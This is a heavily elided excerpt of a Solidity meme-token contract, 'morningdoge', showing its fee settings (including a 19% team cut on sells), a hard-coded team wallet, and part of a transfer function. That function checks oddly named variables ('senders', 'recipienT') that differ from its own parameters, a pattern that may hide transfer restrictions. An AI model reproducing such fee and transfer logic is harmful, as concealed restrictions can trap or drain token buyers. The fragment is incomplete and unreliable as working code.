...
contract morningdoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "morningdoge";
    string private _symbol = "MorninGDoge";
    ...
    uint256 private _buyruinFee = 0;
    uint256 private _buyTeamFee = 9;
    
    uint256 private _sellLiquidityFee = 1;
    uint256 private _sellruinFee = 0;
    uint256 private _sellTeamFee = 19;

    uint256 private _liquidityShare = 1;
    uint256 private _ruinShare = 0;
    uint256 private _teamShare = 19;

    uint256 private _airDropFee = 0;

    uint256 private _totalTaxIfBuying = 10;
    uint256 private _totalTaxIfSelling = 20;
    uint256 private _totalDistributionShares = 30;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x83edc24AE9d738111D4C480644D6C18f881a0888));
        ruinWalletAddress = payable(address(0x000000000000000000000000000000000000dEaD));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(senders != recipienT || !isExcludedFromFee[senders]){
